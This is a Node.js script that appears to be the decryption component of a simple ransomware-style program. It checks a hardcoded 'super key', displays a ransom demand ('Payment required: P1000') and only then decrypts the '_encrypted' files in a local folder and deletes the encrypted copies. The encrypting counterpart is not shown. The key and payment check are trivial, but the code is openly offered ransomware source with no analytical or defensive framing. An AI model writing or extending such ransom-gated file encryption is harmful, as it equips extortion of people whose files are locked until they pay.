const fs = require('fs');
const path = require('path');
const encryptor = require('file-encryptor');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Enter the super key: ', (superKey) => {
  if (superKey !== 'amaro') {
    console.error('Invalid super key. Exiting...');
    rl.close();
    return;
  }

  rl.question('Payment required: P1000. Enter payment amount: ', (payment) => {
    if (payment !== '1000') {
      console.error('Invalid payment amount. Exiting...');
      rl.close();
      return;
    }

    rl.close();

    decryptFiles();
  });
});

function decryptFiles() {
  const key = 'amaro';
  const inputFolder = './Text';

  fs.readdir(inputFolder, (err, files) => {
    if (err) {
      console.error('Error reading input folder:', err);
      return;
    }

    files.forEach(file => {
      const inputFilePath = path.join(inputFolder, file);

      if (file.endsWith('_encrypted')) {
        const originalFileName = file.slice(0, -('_encrypted'.length));

        const outputFilePath = path.join(inputFolder, `${originalFileName}`);

        encryptor.decryptFile(inputFilePath, outputFilePath, key, function(err) {
          if (err) {
            console.error(`Decryption error for ${file}:`, err);
          } else {
            console.log(`Decryption complete for ${file}.`);

            fs.unlink(inputFilePath, (err) => {
              if (err) {
                console.error(`Error deleting ${file} after decryption:`, err);
              } else {
                console.log(`Deleted encrypted file ${file} after decryption.`);
              }
            });
          }
        });
      }
    });
  });
}
